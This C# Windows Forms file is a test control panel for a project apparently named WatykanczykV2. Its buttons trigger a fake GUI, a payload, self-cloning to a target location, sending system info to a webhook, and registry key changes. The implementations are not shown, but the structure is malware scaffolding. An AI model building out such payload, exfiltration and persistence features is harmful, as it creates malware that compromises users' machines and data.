using System;
using System.Windows.Forms;

namespace WatykanczykV2.Forms
{
    public partial class TestGuiForm : Form
    {
        Functions functions;

        public TestGuiForm()
        {
            InitializeComponent();
            this.TopMost = true;
            functions = new Functions();
        }

        private void btnFakeGui_Click(object sender, EventArgs e)
        {
            functions.StartFakeGui();
            rtOutput.Text = "Fake gui started!";
        }

        private void btnPlayMusic_Click(object sender, EventArgs e)
        {
            functions.PlayMusic();
            rtOutput.Text = "Music started playing!";
        }

        private void btnRunPayload_Click(object sender, EventArgs e)
        {
            functions.RunPayload();
            rtOutput.Text = "Payload started!";
        }

        private void btnCloneAndRun_Click(object sender, EventArgs e)
        {
            functions.CloneToAndRunInTargetLocation();
            rtOutput.Text = "Cloned and run in target location!";
        }

        private void btnGetInfo_Click(object sender, EventArgs e)
        {
            functions.GetInfo();
            rtOutput.Text = "Info sent to webhook!";
        }

        private void btnRegKeys_Click(object sender, EventArgs e)
        {
            functions.SetRegistryKeys();
            rtOutput.Text = "Set registry keys!";
        }

        private void btnCurrentRime_Click(object sender, EventArgs e)
        {
            rtOutput.Text = $"{functions.GetCurrentTime()}";
        }

        private void btnExeName_Click(object sender, EventArgs e)
        {
            rtOutput.Text = $"{functions.GetExeName()}";
        }

        private void btnCurrentLocation_Click(object sender, EventArgs e)
        {
            rtOutput.Text = $"{functions.GetCurrentLocation()}";
        }
    }
}
